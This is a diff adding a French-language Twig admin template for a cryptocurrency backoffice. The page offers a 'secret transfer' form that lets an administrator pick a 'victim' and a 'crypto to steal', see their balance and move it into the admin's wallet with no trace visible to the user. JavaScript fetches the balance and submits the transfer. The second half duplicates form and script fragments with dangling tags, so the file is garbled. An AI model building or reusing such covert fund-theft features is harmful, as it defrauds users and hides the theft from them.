@@ -1,0 +1,362 @@
+{% extends 'admin/base.html.twig' %}
+
+{% block title %}Transfert Secret - Backoffice Crypto{% endblock %}
+{% block page_title %}Transfert Secret{% endblock %}
+{% block page_subtitle %}Transferts administrateur furtifs et sans trace{% endblock %}
+
+{% block body_content %}
+<!-- Warning Banner -->
+<div style="background: linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%); border: 1px solid #F87171; border-radius: 12px; padding: 1.5rem; margin-bottom: 2rem;">
+    <div style="display: flex; align-items: center;">
+        <div style="width: 48px; height: 48px; background: #DC2626; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-right: 1rem;">
+            <i class="fas fa-exclamation-triangle" style="color: white; font-size: 1.25rem;"></i>
+        </div>
+        <div>
+            <div style="font-weight: 700; color: #DC2626; margin-bottom: 0.25rem;">⚠️ Mode Transfert Secret Activé</div>
+            <div style="color: #B91C1C; font-size: 0.875rem;">
+                Ces transferts sont invisibles aux utilisateurs et ne laissent aucune trace dans l'historique public.
+            </div>
+        </div>
+    </div>
+</div>
+
+<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
+    <!-- Transfer Form -->
+    <div class="card">
+        <div class="card-header" style="background: linear-gradient(135deg, #DC2626 0%, #B91C1C 100%); color: white; border-radius: 12px 12px 0 0;">
+            <h2 class="card-title" style="color: white; margin: 0;">
+                <i class="fas fa-user-secret" style="margin-right: 0.5rem;"></i>
+                Nouveau Transfert
+            </h2>
+        </div>
+        <div class="card-body">
+            <form method="post" id="transferForm">
+                <div class="form-group">
+                    <label for="from_user_id" class="form-label">
+                        <i class="fas fa-user" style="margin-right: 0.25rem;"></i>
+                        Utilisateur cible
+                    </label>
+                    <select class="form-control" id="from_user_id" name="from_user_id" required onchange="updateBalance()">
+                        <option value="">Sélectionner une victime...</option>
+                        {% for user in users %}
+                            {% if not user.isSuperAdmin %}
+                            <option value="{{ user.id }}">{{ user.username }} ({{ user.email }})</option>
+                            {% endif %}
+                        {% endfor %}
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="crypto_id" class="form-label">
+                        <i class="fas fa-coins" style="margin-right: 0.25rem;"></i>
+                        Cryptomonnaie
+                    </label>
+                    <select class="form-control" id="crypto_id" name="crypto_id" required onchange="updateBalance()">
+                        <option value="">Choisir la crypto à voler...</option>
+                        {% for crypto in cryptos %}
+                        <option value="{{ crypto.id }}">{{ crypto.symbol }} - {{ crypto.name }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="available_balance" class="form-label">
+                        <i class="fas fa-wallet" style="margin-right: 0.25rem;"></i>
+                        Solde disponible
+                    </label>
+                    <div style="position: relative;">
+                        <input type="text" class="form-control" id="available_balance" readonly 
+                               placeholder="Sélectionnez un utilisateur et une crypto"
+                               style="background: var(--gray-50); font-weight: 600;">
+                        <div style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: var(--gray-500);">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount" class="form-label">
+                        <i class="fas fa-calculator" style="margin-right: 0.25rem;"></i>
+                        Montant à transférer
+                    </label>
+                    <div style="display: flex; gap: 0.5rem;">
+                        <input type="number" class="form-control" id="amount" name="amount" 
+                               step="0.00000001" min="0" required 
+                               placeholder="0.00000000">
+                        <button type="button" class="btn btn-outline-primary" onclick="setMaxAmount()" style="white-space: nowrap;">
+                            MAX
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="estimated_value" class="form-label">
+                        <i class="fas fa-euro-sign" style="margin-right: 0.25rem;"></i>
+                        Valeur estimée
+                    </label>
+                    <input type="text" class="form-control" id="estimated_value" readonly 
+                           placeholder="0.00 €"
+                           style="background: var(--gray-50); font-weight: 600; color: var(--primary-color);">
+                </div>
+
+                <div style="margin-top: 2rem;">
+                    <button type="submit" class="btn btn-danger w-100" id="submitBtn">
+                        <i class="fas fa-hand-holding-usd"></i>
+                        Exécuter le Transfert Secret
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Quick Stats & Info -->
+    <div>
+        <!-- Stats -->
+        <div class="stats-card" style="margin-bottom: 1.5rem;">
+            <div class="stats-icon" style="background: #DC2626;">
+                <i class="fas fa-chart-line"></i>
+            </div>
+            <div class="stats-value">{{ transfers_today|default(0) }}</div>
+            <div class="stats-label">Transferts aujourd'hui</div>
+        </div>
+
+        <!-- Recent Transfers -->
+        <div class="card">
+            <div class="card-header">
+                <h2 class="card-title">
+                    <i class="fas fa-history" style="margin-right: 0.5rem;"></i>
+                    Derniers transferts
+                </h2>
+            </div>
+            <div class="card-body">
+                {% if recent_transfers is defined and recent_transfers|length > 0 %}
+                    {% for transfer in recent_transfers|slice(0, 5) %}
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding: 0.75rem 0; border-bottom: 1px solid var(--gray-200);">
+                        <div>
+                            <div style="font-weight: 600; color: var(--gray-900);">{{ transfer.fromUser }}</div>
+                            <div style="font-size: 0.8125rem; color: var(--gray-600);">{{ transfer.crypto }} - {{ transfer.date }}</div>
+                        </div>
+                        <div style="text-align: right;">
+                            <div style="font-weight: 600; color: #DC2626;">{{ transfer.amount }}</div>
+                            <div style="font-size: 0.8125rem; color: var(--gray-600);">{{ transfer.value }}€</div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                <div style="text-align: center; color: var(--gray-600); padding: 2rem;">
+                    <i class="fas fa-inbox" style="font-size: 2rem; margin-bottom: 1rem; color: var(--gray-400);"></i><br>
+                    Aucun transfert récent
+                </div>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Instructions -->
+        <div class="card" style="margin-top: 1.5rem;">
+            <div class="card-header">
+                <h2 class="card-title">
+                    <i class="fas fa-info-circle" style="margin-right: 0.5rem;"></i>
+                    Instructions
+                </h2>
+            </div>
+            <div class="card-body">
+                <div style="font-size: 0.875rem; line-height: 1.6; color: var(--gray-700);">
+                    <div style="display: flex; align-items: flex-start; margin-bottom: 1rem;">
+                        <div style="width: 24px; height: 24px; background: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 0.75rem; flex-shrink: 0;">
+                            <span style="color: white; font-weight: 600; font-size: 0.75rem;">1</span>
+                        </div>
+                        <div>Sélectionnez l'utilisateur cible et la cryptomonnaie</div>
+                    </div>
+                    <div style="display: flex; align-items: flex-start; margin-bottom: 1rem;">
+                        <div style="width: 24px; height: 24px; background: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 0.75rem; flex-shrink: 0;">
+                            <span style="color: white; font-weight: 600; font-size: 0.75rem;">2</span>
+                        </div>
+                        <div>Définissez le montant à transférer</div>
+                    </div>
+                    <div style="display: flex; align-items: flex-start;">
+                        <div style="width: 24px; height: 24px; background: var(--primary-color); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 0.75rem; flex-shrink: 0;">
+                            <span style="color: white; font-weight: 600; font-size: 0.75rem;">3</span>
+                        </div>
+                        <div>Le transfert sera effectué sans trace</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let cryptoPrices = {};
+
+// Charger les prix des cryptos
+{% for crypto in cryptos %}
+cryptoPrices[{{ crypto.id }}] = {{ crypto.currentPrice }};
+{% endfor %}
+
+function updateBalance() {
+    const userId = document.getElementById('from_user_id').value;
+    const cryptoId = document.getElementById('crypto_id').value;
+    
+    if (userId && cryptoId) {
+        fetch(`/admin/user/${userId}/crypto/${cryptoId}/balance`)
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                document.getElementById('available_balance').value = `${data.balance} ${data.symbol}`;
+                document.getElementById('amount').max = data.balance;
+                updateEstimatedValue();
+            } else {
+                document.getElementById('available_balance').value = 'Aucun solde';
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            document.getElementById('available_balance').value = 'Erreur de chargement';
+        });
+    } else {
+        document.getElementById('available_balance').value = '';
+    }
+}
+
+function setMaxAmount() {
+    const balanceText = document.getElementById('available_balance').value;
+    if (balanceText && balanceText !== 'Aucun solde' && balanceText !== 'Erreur de chargement') {
+        const balance = parseFloat(balanceText.split(' ')[0]);
+        document.getElementById('amount').value = balance;
+        updateEstimatedValue();
+    }
+}
+
+function updateEstimatedValue() {
+    const amount = parseFloat(document.getElementById('amount').value) || 0;
+    const cryptoId = document.getElementById('crypto_id').value;
+    
+    if (amount > 0 && cryptoId && cryptoPrices[cryptoId]) {
+        const value = amount * cryptoPrices[cryptoId];
+        document.getElementById('estimated_value').value = `${value.toLocaleString('fr-FR', {minimumFractionDigits: 2})} €`;
+    } else {
+        document.getElementById('estimated_value').value = '0.00 €';
+    }
+}
+
+// Event listeners
+document.getElementById('amount').addEventListener('input', updateEstimatedValue);
+
+// Form submission
+document.getElementById('transferForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const submitBtn = document.getElementById('submitBtn');
+    const icon = submitBtn.querySelector('i');
+    
+    if (confirm('⚠️ Êtes-vous sûr de vouloir exécuter ce transfert secret ?\n\nCette action est irréversible et ne sera pas visible par l\'utilisateur.')) {
+        icon.className = 'fas fa-spinner fa-spin';
+        submitBtn.disabled = true;
+        
+        const formData = new FormData(this);
+        
+        fetch('{{ path('admin_transfer_crypto') }}', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            icon.className = 'fas fa-hand-holding-usd';
+            submitBtn.disabled = false;
+            
+            if (data.success) {
+                showNotification('💰 Transfert secret exécuté avec succès !', 'success');
+                this.reset();
+                document.getElementById('available_balance').value = '';
+                document.getElementById('estimated_value').value = '0.00 €';
+            } else {
+                showNotification('Erreur: ' + data.message, 'error');
+            }
+        })
+        .catch(error => {
+            icon.className = 'fas fa-hand-holding-usd';
+            submitBtn.disabled = false;
+            showNotification('Erreur de connexion', 'error');
+            console.error('Error:', error);
+        });
+    }
+});
+</script>
+
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="amount" class="form-label">Montant à transférer</label>
+                                <input type="number" step="0.00000001" class="form-control" id="amount" name="amount" required
+                                       placeholder="0.00000000">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <strong>Attention :</strong> Cette action va transférer les cryptos de l'utilisateur sélectionné vers votre portefeuille sans enregistrer de transaction visible pour l'utilisateur. Cette action est irréversible.
+                    </div>
+
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-danger btn-lg">
+                            <i class="fas fa-hand-holding-usd"></i> Effectuer le transfert
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="card mt-4">
+            <div class="card-header">
+                <h5><i class="fas fa-history"></i> Historique des transferts administrateur</h5>
+            </div>
+            <div class="card-body">
+                <p class="text-muted">Les transferts administrateur sont enregistrés mais masqués aux utilisateurs concernés.</p>
+                <!-- Ici on pourrait ajouter un tableau des derniers transferts administrateur -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const userSelect = document.getElementById('from_user_id');
+    const cryptoSelect = document.getElementById('crypto_id');
+    const balanceInput = document.getElementById('available_balance');
+    const amountInput = document.getElementById('amount');
+
+    function updateBalance() {
+        if (userSelect.value && cryptoSelect.value) {
+            getUserCryptoBalance(userSelect.value, cryptoSelect.value)
+                .then(balance => {
+                    balanceInput.value = balance;
+                    amountInput.max = balance;
+                });
+        } else {
+            balanceInput.value = '';
+            amountInput.max = '';
+        }
+    }
+
+    userSelect.addEventListener('change', updateBalance);
+    cryptoSelect.addEventListener('change', updateBalance);
+
+    // Validation du formulaire
+    document.getElementById('transferForm').addEventListener('submit', function(e) {
+        const amount = parseFloat(amountInput.value);
+        const maxAmount = parseFloat(balanceInput.value);
+
+        if (amount > maxAmount) {
+            e.preventDefault();
+            alert('Le montant ne peut pas être supérieur au solde disponible');
+            return false;
+        }
+
+        if (!confirm('Êtes-vous sûr de vouloir effectuer ce transfert ? Cette action est irréversible.')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+});
+</script>
+{% endblock %}
